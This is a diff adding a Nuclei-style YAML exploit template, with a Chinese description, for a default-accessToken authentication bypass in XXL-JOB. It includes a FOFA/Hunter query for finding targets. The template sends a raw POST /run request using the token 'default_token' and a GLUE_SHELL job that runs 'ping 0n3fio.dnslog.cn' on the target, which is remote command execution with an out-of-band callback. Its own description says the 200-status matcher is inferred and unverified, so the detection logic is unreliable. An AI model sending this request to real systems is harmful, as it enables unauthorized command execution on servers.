@@ -1,0 +1,38 @@
+id: poc-4b568bcfcb3c27df5656
+info:
+  name: XXL-JOB默认accessToken权限绕过漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/4b568bcfcb3c27df56566527e18ead30
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 4b568bcfcb3c27df56566527e18ead30
+    fofa: + hunter`app.name="XXL-JOB"`
+http:
+- raw:
+  - 'POST /run HTTP/1.1
+
+    Content-Type: application/json
+
+    XXL-JOB-ACCESS-TOKEN: default_token
+
+    User-Agent: Java/1.8.0_391
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Content-Length: 323
+
+    Connection: close
+
+
+    {"jobId": 287040,"executorHandler": "demoJobHandler","executorParams": "demoJobHandler","executorBlockStrategy": "COVER_EARLY","executorTimeout": 0,"logId": 1,"logDateTime": 1586629003729,"glueType": "GLUE_SHELL","glueSource": "ping 0n3fio.dnslog.cn","glueUpdatetime": 1586699003758,"broadcastIndex": 0,"broadcastTotal": 0}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
